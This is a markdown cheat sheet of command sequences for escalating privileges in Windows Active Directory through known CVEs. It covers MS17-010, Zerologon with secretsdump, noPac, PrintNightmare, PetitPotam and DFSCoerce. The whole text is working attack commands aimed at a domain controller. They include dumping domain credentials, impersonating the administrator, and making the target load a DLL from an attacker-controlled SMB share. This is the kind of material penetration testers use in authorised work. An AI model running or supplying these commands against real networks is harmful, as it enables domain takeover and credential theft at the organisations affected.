# ad-cve-privesc

## ms17-010
```
nxc smb <dc-ip> -u <user_name> -p <user_password> -M ms17-010   
use exploit/windows/smb/ms17_010_psexec   
set rhosts <dc-ip>   
run
```   
   
## zerologon
```
nxc smb <dc-ip> -u '' -p '' -M zerologon   
python3 zerologon.py <dc_name> <dc-ip>   
impacket-secretsdump -no-pass -just-dc <domain_name>/<dc_name>\$@<dc-ip>
```
   
## nopac
```
nxc smb <dc-ip> -u <user_name> -p <user_password>  -M nopac   
cd noPac   
python3 noPac.py <domain_name>/<user_name>:<user_password> -dc-ip <dc-ip> -dc-host <dc_name> -use-ldap --impersonate administrateur -dump -use-vss
```
   
## printnightmare
```
nxc smb <dc-ip> -u <user_name> -p <user_password> -M printnightmare   
nxc smb <dc-ip> -u <user_name> -p <user_password> -M enum_av   
cd PrintNightmare   
impacket-smbserver share ./share -smb2support   
python3 printnightmare.py -dll '\\<attacker_ip>\share\nightmare.dll' '<user_name>:<user_password>@<dc-ip>'
```
   
## petitpotam
```
nxc smb <dc-ip> -u '' -p '' -M petitpotam   
responder -I eth0   
python3 PetitPotam.py <attacker_ip> <dc-ip>
```
   
## dfscoerce
```
nxc smb <dc-ip> -u <user_name> -p <user_password> -M dfscoerce   
responder -I eth0   
python3 dfscoerce.py -u <user_name> -p <user_password> <attacker_ip> <dc-ip>
```
